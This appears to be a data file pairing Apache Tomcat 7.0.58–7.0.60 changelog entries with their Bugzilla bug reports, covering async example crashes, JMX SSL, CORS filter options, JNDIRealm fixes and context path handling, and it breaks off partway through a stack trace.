Web applications|Tomcat 7.0.60 (violetagg)|update|57644|Update examples to use Apache Standard Taglib 1.2.5. (jboynes)|Update examples to use newer version of taglibs|The JSP example use an old version of JSTL and should be updated to 1.2.3|https://bz.apache.org/bugzilla/show_bug.cgi?id=57644
Web applications|Tomcat 7.0.60 (violetagg)|fix|57683|Ensure that if a client aborts their connection to the stock ticker example (the only way a client can disconnect), the example continues to work for existing and new clients. (markt)|Crash of stockticket async example caused by an aborted client request|"I mentioned this issue in ""Time for 7.0.60"" thread on dev@.

It is a bug with error handling in example webapp. It is not a regression from recent changes. It is reproducible with 7.0.59.

Steps to reproduce:
Using Tomcat 7.0.59, JDK 6u45.

1. Start Tomcat

2. Visit stockicker example,
http://localhost:8080/examples/async/stockticker

3. Abort the request while the page is being loaded (Press ""Esc"" key on keyboard)

4. Re-visit the example
http://localhost:8080/examples/async/stockticker

Expected: Working stockicker example.

Actual:
1) Browser waits for a response. After several seconds the progress indicator stops. A blank page is displayed.

2) Access log shows response status 200, but byte counter is zero (""-"").

127.0.0.1 - - [10/Mar/2015:17:45:31 +0300] ""GET /examples/async/stockticker HTTP/1.1"" 200 -

3) Looking into catalina.2015-03-10.log, there is the following exception:
[[[
10.03.2015 17:36:58 org.apache.coyote.AbstractProcessor setErrorState
INFO: An error occurred in processing while on a non-container thread. The connection will be closed immediately
java.net.SocketException: Software caused connection abort: socket write error
	at java.net.SocketOutputStream.socketWrite0(Native Method)
	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)
	at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
	at org.apache.coyote.http11.InternalOutputBuffer.realWriteBytes(InternalOutputBuffer.java:215)
	at org.apache.tomcat.util.buf.ByteChunk.flushBuffer(ByteChunk.java:480)
	at org.apache.coyote.http11.InternalOutputBuffer.flush(InternalOutputBuffer.java:119)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:800)
	at org.apache.coyote.Response.action(Response.java:172)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:363)
	at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:331)
	at org.apache.catalina.connector.CoyoteWriter.flush(CoyoteWriter.java:98)
	at async.AsyncStockServlet.writeStock(AsyncStockServlet.java:98)
	at async.AsyncStockServlet.tick(AsyncStockServlet.java:81)
	at async.Stockticker.run(Stockticker.java:84)
	at java.lang.Thread.run(Thread.java:662)
]]]

4) Looking at console,
There is the same exception as in ""3)"",
followed by the following exception:
[[[
java.lang.IllegalStateException: The request associated with the AsyncContext has already completed processing.
        at org.apache.catalina.core.AsyncContextImpl.check(AsyncContextImpl.java
:553)
        at org.apache.catalina.core.AsyncContextImpl.getResponse(AsyncContextImp
l.java:265)
        at async.AsyncStockServlet.writeStock(AsyncStockServlet.java:86)
        at async.AsyncStockServlet.tick(AsyncStockServlet.java:81)
        at async.Stockticker.run(Stockticker.java:84)
        at java.lang.Thread.run(Thread.java:662)
]]]

Essentially, the async.Stockticker thread crashed due to a non handled ISE. This explains the behaviour.

5) The exception in ""4)"" is logged to the console only. It is not logged into Tomcat log files."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57683
Web applications|Tomcat 7.0.60 (violetagg)|fix||Correct the documentation for deployOnStartup to make clear that if a WAR file is updated while Tomcat is stopped and unpackWARs is true, Tomcat will not detect the changed WAR file when it starts and will not replace the unpacked WAR file with the contents of the updated WAR. (markt)|||
Extras|Tomcat 7.0.60 (violetagg)|fix|57377|Remove the restriction that prevented the use of SSL when specifying a bind address with the JMXRemoteLifecycleListener. Also enable SSL to be configured for the registry as well as the server. (markt)|Incorrect use of standard SSL properties for JMX in JMXRemoteLifecycleListener|"This ticket references some older bugs and changes related to them as below:
- https://issues.apache.org/bugzilla/show_bug.cgi?id=55017 - Ability to provide an RMI bind address (so that the RMI server can be selectively bound to loopback only)

- https://issues.apache.org/bugzilla/show_bug.cgi?id=56039 - This is a symptom to my problem, but was fixed and works fine.

Here is the problem:
The standard JMX properties (http://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html, http://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html#gdevf) are different for enabling SSL/TLS for the RMI registry (where jmxrmi is registered) and the JMX RMI server (which carries the JMX operations), being com.sun.management.jmxremote.registry.ssl and com.sun.management.jmxremote.ssl respectively.
When 55017 was done, the RMI server factories thus created were used in creating the RMI registry (http://svn.apache.org/viewvc/tomcat/trunk/java/org/apache/catalina/mbeans/JmxRemoteLifecycleListener.java?revision=1498340&view=markup, line number 274)
This works fine as long as we are not using SSL and I guess this is one of the reasons Alexey Noskov said ""rmiBindAddress incompatible with rmiSSL"".

This side effect was noticed in bug# 56039 and was fixed to allow RMI registry clients to use com.sun.jndi.rmi.factory.socket.

Recommendation:
Would it be possible to have separate RMIServerSocketFactory for JMX/RMI and RMI registry, one dictated by com.sun.management.jmxremote.ssl (which results in the rmiSSL flag) and the other by com.sun.management.jmxremote.registry.ssl.

This way the agent will be more compliant and we'd still have the ability to leave the RMI registry non SSL (which is to get the JMX/RMI connection stub).

We can also fix the ""rmiBindAddress incompatible with rmiSSL"" problem by creating a custom SslRMIServerSocketFactory (basically extending the one in JDK and re-implementing the createServerSocket method to use the given rmiBindAddress.

I'd be happy to do these changes, and can provide the changed version of this file, if this request seems reasonable. May be a patch as well if I learn SVN quickly.

PS: The whole reason I reached here is that we in our products use custom JMX authentication and SSL/TLS implementation. We implement the jmx.remote.protocol.provider.pkgs approach to inject our SSL factories for JMXConnnectorServer. This recently broke because we have no control over how the server socket for RMI registry is created. We ended up setting com.sun.management.jmxremote.ssl to false to avoid this JMXRemoteLifecycleListener to stop doing SSL anywhere."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57377
Tribes|Tomcat 7.0.60 (violetagg)|fix||Make sure that refuse the messages from a different domain in DomainFilterInterceptor. (kfujino)|||
Other|Tomcat 7.0.60 (violetagg)|add||Enhance bean factory used for JNDI resources. New attribute forceString allows to support non-standard string argument property setters. (rjung)|||
Other|Tomcat 7.0.60 (violetagg)|fix||Fix TestAbstractAjpProcessor unit test failures on Windows. (kkolinko)|||
Other|Tomcat 7.0.60 (violetagg)|fix||Guard the digester from MbeansDescriptorsDigesterSource with its own lock object. (fschumacher)|||
Other|Tomcat 7.0.60 (violetagg)|fix|57558|Add missing JAR in Ant task definition required by the validate task. (markt/kkolinko)|<validator> ant task throws NoClassDefFoundError - Tomcat 8.0.18|"This has been reported on the users list

http://mail-archives.apache.org/mod_mbox/tomcat-users/201502.mbox/%3CCAHvOsHzPt9hK8iGSTfXCzCcUSMq4N0DH5o1WRzTFvW-pKdVRRg%40mail.gmail.com%3E
http://tomcat.markmail.org/thread/du5j6z54cw2pfdvz

<quote>
I'm using Tomcat 8.0.18.
I've following ant build.xml:

<import file=""${tomcat.home}/bin/
catalina-tasks.xml""/>

   <target name=""jspc"">

    <jasper
             validateXml=""false""
             uriroot=""${webapp.path}""
             webXmlFragment=""${webapp.path}/WEB-INF/generated_web.xml""
             outputDir=""${webapp.path}/WEB-INF/src"" />

  <validator path=""${webapp.path}"" />
...
  </target>

<jasper> task works great, but <validator> task throws
java.lang.NoClassDefFoundError: org/apache/catalina/Globals

</quote>


Searching the jars, ""org/apache/catalina/Globals.class"" is in catalina.jar, which is not listed in bin/catalina-tasks.xml

I think that catalina-tasks.xml shall list all jars from ${catalina.home}/lib/*.jar, instead of naming just a few of those.  Besides catalina.jar others that are missing are *-i18n-*.jar ones."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57558
Other|Tomcat 7.0.60 (violetagg)|add||List names of Testsuites that have failed or skipped tests when running tests with Ant. (kkolinko)|||
Other|Tomcat 7.0.60 (violetagg)|fix|57703|Update the http-method definition for web applications using a Servlet 2.5 descriptor as per Servlet 2.5 MR 6. (markt)|Update http-methodType definition in web-app_2_5.xsd according with Servlet 2.5 mrel2|"For reference:
[1] https://wiki.apache.org/tomcat/Specifications
[2] https://jcp.org/aboutJava/communityprocess/maintenance/jsr154/JSR154ChangeLog.html

There exists two versions of Servlet 2.5 specification [1]:
1) ""Maintenance Release"", 11 May, 2006
2) ""Maintenance Release 2"", 11 Sep, 2007

I do not have a copy of ""1)"", but my copy of ""2)"" (servlet-2_5-mrel2-spec.pdf) has ""Version 2.5 MR6"" on its front page. It aligns with change log numbering [2] and with ""Change Log"" section of the PDF file.

So I am looking at ""Changes since Servlet 2.5 MR 5"" section of the PDF.

There are two clarifications and one change to the deployment descriptor.

[quote]
The facet for http-method element in the deployment descriptor is currently more
restrictive than the http specification. The following change is being made to the
descriptor to allow the set of method names as defined by the http specification. The
pattern value of http-methodType is being changed from
<xsd:pattern value=""[\p{L}-[\p{Cc}\p{Z}]]+""/>
to closely match what the http specification lists as allowable http methods names.
<xsd:pattern value=""[&#33;-&#126;-[\(\)&#60;&#62;@,;:&#34;/
\[\]?=\{\}\\\p{Z}]]+""/>
[/quote]

This change is not present in our copy of  java\javax\servlet\resources\web-app_2_5.xsd  in Tomcat 6, nor in 7/8/trunk.

For later version of specification the correct value is present in web-common_3_0.xsd"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57703
Other|Tomcat 7.0.60 (violetagg)|update||Update to Tomcat Native Library version 1.1.33 to pick up the Windows binaries that are based on OpenSSL 1.0.1m and APR 1.5.1. (markt)|||
Jasper|Tomcat 7.0.59 (violetagg)|fix|57504|Initialize TLD locations cache when creating the ServletContext. (jboynes)|Jasper task (JspC) throws NPE on taglibs in 7.0.58|"Created attachment 32400 [details]
Repeat build.xml

It seems like revision 1645615 broke the ant jasper task in 7.0.58 for taglibs.

Repeat:

 1) Download and unzip apache-tomcat-7.0.58.zip and apache-ant-1.9.4-bin.zip to a temporary directory.

 2) Put the following into a new file build.xml in the directory: (attached, based on http://tomcat.apache.org/tomcat-7.0-doc/jasper-howto.html#Web_Application_Compilation)

   <project>

     <import file=""apache-tomcat-7.0.58/bin/catalina-tasks.xml""/>

     <target name=""jspc"">

       <jasper
                validateXml=""false""
                uriroot=""apache-tomcat-7.0.58/webapps/examples""
                webXmlFragment=""tmp/WEB-INF/generated_web.xml""
                outputDir=""tmp/WEB-INF/src"" />

     </target>
   </project>

 3) Execute ""apache-ant-1.9.4/bin/ant jspc"" in the directory.

Expected result:

 Compiled output in tmp/WEB-INF

Actual result:

 Exception is thrown and only partial output to tmp/WEB-INF:

 jspc:
   [jasper] java.lang.NullPointerException
   [jasper] 	at org.apache.jasper.JspCompilationContext.getTldLocation(JspCompilationContext.java:618)
   [jasper] 	at org.apache.jasper.compiler.Parser.parseTaglibDirective(Parser.java:409)
   [jasper] 	at org.apache.jasper.compiler.Parser.parseDirective(Parser.java:475)
   [jasper] 	at org.apache.jasper.compiler.Parser.parseElements(Parser.java:1410)
   [jasper] 	at org.apache.jasper.compiler.Parser.parse(Parser.java:138)
   [jasper] 	at org.apache.jasper.compiler.ParserController.doParse(ParserController.java:242)
   [jasper] 	at org.apache.jasper.compiler.ParserController.parse(ParserController.java:102)
   [jasper] 	at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:199)
   [jasper] 	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:374)
   [jasper] 	at org.apache.jasper.JspC.processFile(JspC.java:1213)
   [jasper] 	at org.apache.jasper.JspC.execute(JspC.java:1364)
   [jasper] 	at org.apache.tools.ant.UnknownElement.execute(UnknownElement.java:292)
   [jasper] 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
   [jasper] 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
   [jasper] 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
   [jasper] 	at java.lang.reflect.Method.invoke(Method.java:606)
   [jasper] 	at org.apache.tools.ant.dispatch.DispatchUtils.execute(DispatchUtils.java:106)
   [jasper] 	at org.apache.tools.ant.Task.perform(Task.java:348)
   [jasper] 	at org.apache.tools.ant.Target.execute(Target.java:435)
   [jasper] 	at org.apache.tools.ant.Target.performTasks(Target.java:456)
   [jasper] 	at org.apache.tools.ant.Project.executeSortedTargets(Project.java:1393)
   [jasper] 	at org.apache.tools.ant.Project.executeTarget(Project.java:1364)
   [jasper] 	at org.apache.tools.ant.helper.DefaultExecutor.executeTargets(DefaultExecutor.java:41)
   [jasper] 	at org.apache.tools.ant.Project.executeTargets(Project.java:1248)
   [jasper] 	at org.apache.tools.ant.Main.runBuild(Main.java:851)
   [jasper] 	at org.apache.tools.ant.Main.startAnt(Main.java:235)
   [jasper] 	at org.apache.tools.ant.launch.Launcher.run(Launcher.java:280)
   [jasper] 	at org.apache.tools.ant.launch.Launcher.main(Launcher.java:109)

If 7.0.58 is replaced by 7.0.57 then the repeat runs without any exception and with complete output.

The problem seems to be the cleanup of the tldLocationsCache initialization in revision 1645615, partially backported from revision 1541041, since it's still used by JspCompilationContext.getTldLocation.

Possibly the fix is as easy as bringing back the initialization line."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57504
Tribes|Tomcat 7.0.59 (violetagg)|fix||Fix a possible deadlock when receiver thread invokes mapMemberAdded() while ping thread invokes memberAlive(). (kfujino)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix|57173|Revert the fix for 56953 that broke annotation scanning in some cases. (markt)|EOFException during annotation scanning|"Created attachment 32176 [details]
complete console output

After updating Tomcat from version 7.0.54 to 7.0.56 the following exception occurs during startup:
---------------------------------------
...
Okt 30, 2014 2:00:45 PM org.apache.catalina.startup.ContextConfig processAnnotationsJar
SEVERE: Unable to process Jar entry [com/ctc/wstx/api/ReaderConfig.class] from Jar [jar:jndi:/localhost/ssms-gui/WEB-INF/lib/woodstox-core-asl-4.1.2.jar!/] for annotations
java.io.EOFException
        at org.apache.tomcat.util.bcel.classfile.FastDataInputStream.readUnsignedShort(FastDataInputStream.java:120)
        at org.apache.tomcat.util.bcel.classfile.Utility.swallowFieldOrMethod(Utility.java:75)
        at org.apache.tomcat.util.bcel.classfile.ClassParser.readMethods(ClassParser.java:235)
        at org.apache.tomcat.util.bcel.classfile.ClassParser.parse(ClassParser.java:92)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsStream(ContextConfig.java:2071)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJar(ContextConfig.java:1947)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1913)
        at org.apache.catalina.startup.ContextConfig.processAnnotations(ContextConfig.java:1898)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1330)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:889)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:386)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5380)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:649)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:1083)
        at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1879)
        at java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source)
        at java.util.concurrent.FutureTask$Sync.innerRun(Unknown Source)
        at java.util.concurrent.FutureTask.run(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)
...
---------------------------------------

This exception occurs for several JAR files and did not happen with tomcat 7.0.54. Complete console output attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57173
Catalina|Tomcat 7.0.58 (violetagg)|fix|57178|The CORS filter now treats null as a valid origin that matches *. Patch provided by Gregor Zurowski. (markt)|"Add CorsFilter configuration option to allow requests with Origin ""null"""|"CorsFilter does not allow requests with the Origin header set to string ""null"". It treats such requests as invalid CORS requests. The current implementation seems too restrictive and prevents some common use cases: The Origin header is set to ""null"" when the browser cannot determine the origin of a request. This is the case when opening local files in the browser. Common uses cases are local development with remote services and testing hybrid mobile applications. To support such use cases, a new configuration option could be introduced where administrators could explicitly allow CORS requests with ""null"" origins."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57178
Catalina|Tomcat 7.0.58 (violetagg)|fix|57180|Do not limit the CORS filter to only accepting requests that use an HTTP method defined in RFC 7231. (markt)|CorsFilter does not support PATCH method|The CorsFilter provided with Tomcat 7 should support the PATCH method.|https://bz.apache.org/bugzilla/show_bug.cgi?id=57180
Catalina|Tomcat 7.0.58 (violetagg)|fix|57190|Fix ServletContext.getContext(String) when parallel deployment is used so that the correct ServletContext is returned. (markt)|ServletContext.getContext(String) cannot return context when using parallel deployments|"When using ServletContext.getContext(String) in a parallel deployment the context is not returned.

For example:
foo_a##001 and foo_b##001 are deployed.
Page on /foo_a/test.jsp calls ServletContext.getContext(""/foo_b"").  In non parallel deployments this returns the ServletContext for ""/foo_b"". However in parallel deployments the ServletContext for ""/"" is returned instead.

This was encountered using a custom filter that is set to forward certain requests to files in one application to a central default application.

CrossContext is set to true for the context.xml.  This works as long as the wars do not use the version name such as foo_b.war instead of foo_b##001.war.

I would expect ServletContext.getContext(""/foo_b"") to return the current active context for a URL.  Instead it looks like it will require to specify the exact version of a context instead such as ServletContext.getContext(""/foo_b##001"").  

This puts the burden of finding the active version of the context on the calling application rather than the underlying servlet container to provide the most current context when ServletContext.getContext(String) is referenced."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57190
Catalina|Tomcat 7.0.58 (violetagg)|fix|57208|Prevent NPE in JNDI Realm when no results are found in a directory context for a user with specified user name. Based on a patch provided by Jason McIntosh. (violetagg)|NullPointerException on JNDIRealm when search finds no results - org.apache.catalina.realm.JNDIRealm|"When JNDIRealm does a ""getUserBySearch"", and no results are found, a null object is returned.  This causes a NPE in the next few lines where it tries to create a user.

       if (userPatternFormatArray != null && curUserPattern >= 0) {
            user = getUserByPattern(context, username, credentials, attrIds, curUserPattern);
        } else {
            user = getUserBySearch(context, username, attrIds);
        }

        if (userPassword == null && credentials != null) {
            // The password is available. Insert it since it may be required for
            // role searches.
            return new User(user.getUserName(), user.getDN(), credentials,
                    user.getRoles(), user.getUserRoleId());
        }


Should probably be changed to:

       if (userPatternFormatArray != null && curUserPattern >= 0) {
            user = getUserByPattern(context, username, credentials, attrIds, curUserPattern);
            containerLog.debug(""Found user by pattern ("" + user + "")"");
        } else {
            user = getUserBySearch(context, username, attrIds);
            containerLog.debug(""Found user by search ("" + user + "")"");
        }

        if (userPassword == null && credentials != null && user != null) {
            // The password is available. Insert it since it may be required for
            // role searches.
            return new User(user.getUserName(), user.getDN(), credentials,
                    user.getRoles(), user.getUserRoleId());
        }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57208
Catalina|Tomcat 7.0.58 (violetagg)|add|57209|Add a new attribute, userSearchAsUser to the JNDI Realm. (markt)|JNDIRealm userSearch does not work against active directory with roles|"JNDIRealm without connectionPassword/connectionName on role lookups - role search as user does not work as intended.  If you want to search the system as the logged in user for roles:

userBase = DC=Company,DC=com
userSearch = (&(objectCategory=person)(sAMAccountName={0}))
userSubTree = true

This works fine and you can bind as a user, but searching fails.  Search fails because there's no user credentials to bind with and binding anonymously is disabled.  If you have isRoleSearchAsUser turned on the expectation

protected User getUser(DirContext context, String username, String credentials, int curUserPattern) 
does not add the binding user credentials for searching.  A VERY simple fix around line 1297 is to do the following so that searches work with the bound user:


  // Use pattern or search for user entry
            if (userPatternFormatArray != null && curUserPattern >= 0) {
                user = getUserByPattern(context, username, credentials, attrIds, curUserPattern);
            }
            else {
                if (isRoleSearchAsUser()) {
                    userCredentialsAdd(context, username, credentials);
                }
                user = getUserBySearch(context, username, attrIds);
            }

There's probably a cleaner way to do this, but this is how I've managed to get things working at this point.  I'd imagine a property ""userSearchDNPattern"" could be added so that you can specify the pattern for the DN to bind with.  And switch the ""userCredentialsAdd"" to use that userSearchDNPattern"" instead.  With the above fix binding as a user and role lookups now work.  Another option is to change ""roleSearchAsUser"" to something that says ""do all operatins with the authenticated user, assuming he's authorized"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=57209
Catalina|Tomcat 7.0.58 (violetagg)|fix|57215|Ensure that the result of calling HttpServletRequest.getContextPath() is neither decoded nor normalized as required by the Servlet specification. (markt)|Regression in Tomcat 7.0.54 after Bug 56501 with urls starting with //|"After upgrading from 7.0.52 of Tomcat to 7.0.54 we found that our application was now returning 404 resource not found errors when the request uri starts with //.
eg. We have an embedded server created and started something like:

 org.apache.catalina.startup.Embedded embedded = new Embedded();
 org.apache.catalina.Engine engine engine = embedded.createEngine();
 engine.setName("""");
 embedded.setContainer(engine);
 embedded.addEngine(engine);

 ...

 String startPathContextRoot = ""c:\website\data\startPath"";
 org.apache.catalina.Context startPathContext = embedded.createContext(""/startPath"",startPathContextRoot);

 embedded.start()

Then a request to http://host:port//startPath returns 404.
Whereas at Tomcat 7.0.52 it returns what we would expect from a request to 
http://host:port/startPath.
The same behaviour is seen with requests to extended URLs eg:
  http://host:port//startPath/anotherPath.
where they end up at the servlet as expected with 7.0.53 and not with 7.0.54

Debugging this a bit I found that the problem was introduced at 7.0.53 and by the changes under 
https://issues.apache.org/bugzilla/show_bug.cgi?id=56501
which for Tomcat 7 were revision 
http://svn.apache.org/viewvc?view=revision&revision=1594028
If I run our app without these changes in at 7.0.54 then it works fine.

Looking at the changes in the revision I saw some tests were added and so I tried adding some new tests to tomcat/trunk/test/org/apache/catalina/connector/TestRequest.java which I think example the problem:

    @Test
    public void testBug56501p() throws Exception {
        doBug56501(""/path"", ""//path"", ""/path"");
    }

    @Test
    public void testBug56501q() throws Exception {
        doBug56501(""/path"", ""//path/"", ""/path"");
    }

    @Test
    public void testBug56501r() throws Exception {
        doBug56501(""/path"", ""//path/bob"", ""/path"");
    }

    @Test
    public void testBug56501s() throws Exception {
        doBug56501(""/path"", ""//path/bob/"", ""/path"");

If I run these at 7.0.53 they pass.
and running at 7.0.54 they fail with:

Testcase: testBug56501p took 0.307 sec
	FAILED
expected:</[path]> but was:</[]>

Testcase: testBug56501q took 0.275 sec
	FAILED
expected:</[path]> but was:</[]>

Testcase: testBug56501r took 0.246 sec
	FAILED
expected:</[path]> but was:</[]>

Testcase: testBug56501s took 0.32 sec
	FAILED
expected:</[path]> but was:</[]>


I can try and create this with a simple servlet/setup if required if the test additions are not enough.

David"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57215
Catalina|Tomcat 7.0.58 (violetagg)|fix|57216|"Improve handling of invalid context paths. A context path should either be an empty string or start with a '/' and do not end with a '/'. Invalid context path are automatically corrected and a warning is logged. The null and ""/"" values are now correctly changed to """". (markt/kkolinko)"|Servlet mapping not found when creating RequestDispatcher for forward()|"We have a servlet filter which creates a RequestDispatcher used to forward the request to a servlet:

  String processingPath = processPath(req.getServletPath());
  RequestDispatcher dispatch = request.getRequestDispatcher(processingPath);
  dispatch.forward(request, response);

In Tomcat 8 the forward() fails because the servlet path doesn't match the servlet mapping definition.  This only occurs when the context path is ""/"".

We configure our Context in server.xml:

<Host name=""localhost""  appBase="""" createDirs=""false"" unpackWARs=""false"" autoDeploy=""false"" deployOnStartup=""false"">
  <Context path=""/"" ...>
    ...
  </Context>
</Host>

In ApplicationContext.getRequestDispatcher(String path) the context path is prepended to the resource uri:

  uriCC.append(context.getPath(), 0, context.getPath().length());

Then in Mapper.map() a ContextVersion is retrieved from contextObjectToContextVersionMap and passed to internalMapWrapper(), which tries to remove the context path:

  int length = contextVersion.path.length();
    ...
  servletPath = pathOffset + length;
    ...
  path.setOffset(servletPath);

But the path is empty, so the offset is zero, and we end up with an extra ""/"" at the start of the servlet path. This causes the servlet mapping to not be matched.

This is ultimately due to these lines in MapperListener.registerContext():

        String contextPath = context.getPath();
        if (""/"".equals(contextPath)) {
            contextPath = """";
        }

        mapper.addContextVersion(host.getName(), host, contextPath,
                context.getWebappVersion(), context, welcomeFiles, resources,
                wrappers);

In earlier Tomcat versions, the same context object was used to get the context path in both ApplicationContext.getRequestDispatcher() and Mapper.map().  In Tomcat 8 ApplicationContext.getRequestDispatcher() uses a StandardContext object (with path=""/""), while Mapper.map() uses a ContextVersion object (with path="""")."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57216
Catalina|Tomcat 7.0.58 (violetagg)|fix||Correct message that is logged when load-on-startup servlet fails to load. It was logging a wrong name. (kkolinko)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix|57239|Correct several message typos. Includes patch by vladk. (kkolinko)|"Typo in ""org/apache/catalina/connector/LocalStrings.properties"""|"coyoteRequest.alreadyAuthenticated=This is request has already been authenticated

should be:

coyoteRequest.alreadyAuthenticated=This request has already been authenticated"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57239
Catalina|Tomcat 7.0.58 (violetagg)|add||Make the session id generator extensible by adding a SessionIdGenerator interface, an abstract base class and a standard implementation. (rjung)|||
Catalina|Tomcat 7.0.58 (violetagg)|add||Back-port clarification from Servlet 3.1 specification that during async processing an IllegalStateException should be thrown if getRequest() or getResponse() is called after complete() or dispatch(). (markt)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix||Fix a concurrency issue in async processing. Ensure that a non-container thread can not change the async state until the container thread has completed. (markt)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix|57252|Provide application configured error pages with a chance to handle an async error before the built-in error reporting. (markt)|Custom error page is not used for an error that occurs asynchronously|"Created attachment 32224 [details]
Small app to reproduce the problem

If an error is sent as part of some asynchronous processing, for example:

@WebServlet(value = ""/async"", asyncSupported=true)
public class AsyncServlet extends HttpServlet {
       
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		final AsyncContext context = request.startAsync();
		context.start(new Runnable() {
			@Override
			public void run() {
				try {
					response.sendError(500);
				} catch (IOException e) {
				}
				context.complete();
			}
		});
	}
}

Tomcat 7.0.57 renders its default error page rather than the configured custom error page. The same behaviour is also exhibited in recent 8.0.x releases. It's perhaps worth noting that Tomcat 7.0.55 renders an entirely blank page in this scenario.

My expectation is that the custom error page is used and, FWIW, this is what Jetty does.

I have attached a war that can be used to reproduce the problem. /sync can be used to confirm that the custom error page is working. /async will reproduce the problem described above."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57252
Catalina|Tomcat 7.0.58 (violetagg)|fix|57281|Enable non-public Filter and Servlet classes to be configured programmatically via the Servlet 3.0 API and then used without error when running under a SecurityManager. (markt)|Tomcat fails to call method of non-public filter class configured via Servlet 3.0 API when running with SecurityManager|"There is a report on StackOverflow that Spring Boot (1.1.6) application fails on Tomcat 7.0.52 when running with SecurityManager enabled.

https://stackoverflow.com/questions/27189047/springboot-webapp-under-java-securitymanager-throws-exceptions-when-granted-allp

The error is
[[[
java.lang.IllegalAccessException: Class org.apache.catalina.security.SecurityUtil$1 can not access a member of class org.springframework.boot.context.web.ErrorPageFilter with modifiers ""public""
    at sun.reflect.Reflection.ensureMemberAccess(Reflection.java:109) ~[na:1.7.0_65]
    at java.lang.reflect.AccessibleObject.slowCheckMemberAccess(AccessibleObject.java:261) ~[na:1.7.0_65]
    at java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:253) ~[na:1.7.0_65]
    at java.lang.reflect.Method.invoke(Method.java:599) ~[na:1.7.0_65]
    at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:277) ~[catalina.jar:7.0.52]
    at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:274) ~[catalina.jar:7.0.52]
    at java.security.AccessController.doPrivileged(Native Method) ~[na:1.7.0_65]
    at javax.security.auth.Subject.doAsPrivileged(Subject.java:536) ~[na:1.7.0_65]
    at org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:309) ~[catalina.jar:7.0.52]
    at org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:249) ~[catalina.jar:7.0.52]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:237) ~[catalina.jar:7.0.52]
    at org.apache.catalina.core.ApplicationFilterChain.access$000(ApplicationFilterChain.java:55) ~[catalina.jar:7.0.52]
    at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:191) ~[catalina.jar:7.0.52]
    at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:187) ~[catalina.jar:7.0.52]
    at java.security.AccessController.doPrivileged(Native Method) ~[na:1.7.0_65]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:186) ~[catalina.jar:7.0.52]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:220) ~[catalina.jar:7.0.52]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122) [catalina.jar:7.0.52]
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:501) [catalina.jar:7.0.52]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:170) [catalina.jar:7.0.52]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98) [catalina.jar:7.0.52]
    at org.apache.catalina.valves.RemoteIpValve.invoke(RemoteIpValve.java:683) [catalina.jar:7.0.52]
    at ch.qos.logback.access.tomcat.LogbackValve.invoke(LogbackValve.java:178) [logback-access-1.0.13.jar:na]
